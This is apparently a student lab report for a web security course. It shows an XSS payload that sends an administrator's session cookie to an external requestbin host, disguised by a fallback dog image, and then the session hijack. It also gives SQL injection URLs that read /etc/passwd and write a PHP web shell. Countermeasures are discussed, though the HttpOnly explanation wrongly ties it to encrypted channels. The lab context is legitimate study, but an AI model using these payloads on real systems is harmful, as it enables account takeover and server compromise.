# Language-based Security

## Lab 3 - Web Application Security

### Part 1: Cross-Site Scripting (XSS)

The main XSS vulnerability that we found was in the "text" field of the comment section the the home page. Indeed, there was no filtering of any kind of HTML charateres of quotes.
This allowed us to inject javascript code in the field to upload a simple picture and, at the same time, steal the `PHPSESSID`cookie of the administator looking at the web page.

#### Description of the attack

The command that we insert in the "text" field and used to steal the administrator's cookie is:
```javascript
<script>var backup_url='http://media.istockphoto.com/photos/head-shot-of-cute-purebred-rottweiler-dog-pup-hanging-with-paws-over-picture-id1096889426';document.write('<img onerror="this.onerror=null;this.src=backup_url;" src="http://en8mgdzvtyrzg.x.pipedream.net/?'+document.cookie+'  "/>');</script>
```

When the administrator checks the comments' page, the first source of the image will send his cookie (via the `document.cookie` command) to our requestbin url and be analysed.

![Requestbin used to hijack the administrator's cookie ](assets/pipedream.png)

The thing is that he will only see that someone uploaded a picture of a dog because a backup url is used in the `onerror`tag of the `<img/>` in case the first source url doesn't lead to a picture file.
All we need then, to hijack the administator's session, is to replace the value of our `PHPSESSID`cookie, in the dev tools of the web browser, by the value of the administrator's cookie.

![Session hijacking via manual modification of the PHPSESSID cookie ](assets/chrome-dev-tool.png)

Finally, we just need to reload the web page and we successfully hijacked the administrator's session. When we click on the "admin" link, we bypass the login/password step:

![Administrator page ](assets/admin-panel.png)

To prevent this attack from happening, we should sanitize user's inputs in the comment's text field. 
We can add escaping functions in the back-end source code to encode special HTML characteres. Some PHP functions are discussed in the countermeasures part.

#### Countermeasures

- Client-side:

Desactivate javascript code execution option in the web browser:
It is possible in modern web browsers to disable javascript code execution when visiting a web page. This would prevent cookie stealing attacks but some websites need javascript to work properly so it can't be a solution on the long run.

- Server-side:

HttpOnly: 
One of the things that could be done to prevent cookie stealing could be to set the HttpOnly flag on the cookies sent by the server so that they can only be communicated over secure channels (SSL/TLS encryption) and become unreadable with javascript code.
The thing is that we also need to switch to an HTTPS communication protocol between the server and the client if we want the cookies to be sent.


Use escaping/encoding:
Another thing that could be done is to encode HTML entites in the user's inputs like `>` to `&gt;`, `<` to `&lt;` and quotes like `'` and `"` respectively to `&#x27;` and `&quot;`.
In PHP for exemple, we can use functions like `htmlentities()` or `htmlspecialchars()` to escape all special charateres that could be used to inject code in the input fields.

### Part 2: SQL Injection

http://localhost/admin/edit.php?id=0%20union%20select%201,2,load_file("/etc/passwd"),4

http://localhost/admin/edit.php?id=0%20union%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/webshell.php%22